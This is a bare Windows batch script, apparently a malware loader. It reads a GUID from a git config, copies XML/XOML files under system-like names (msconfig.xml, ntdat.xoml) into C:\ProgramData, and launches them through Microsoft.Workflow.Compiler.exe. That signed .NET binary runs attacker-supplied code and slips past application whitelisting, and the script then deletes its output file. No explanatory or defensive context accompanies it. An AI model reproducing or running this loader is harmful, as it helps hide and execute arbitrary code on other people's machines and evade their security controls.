for /f %%i in ('git -C "C:\programdata\git\org-database" config --get custom.guid') do set LID=%%i
cd C:\ 
copy "C:\programdata\git\org-database\[%LID%]\msconfig.xml" "C:\ProgramData\"
copy "C:\programdata\git\org-database\[%LID%]\ntdat.xoml" "C:\ProgramData\" 
start "" /D "C:\ProgramData" cmd /c "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe "C:\ProgramData\msconfig.xml" "C:\ProgramData\cfgdat.xml" && del "C:\ProgramData\cfgdat.xml""
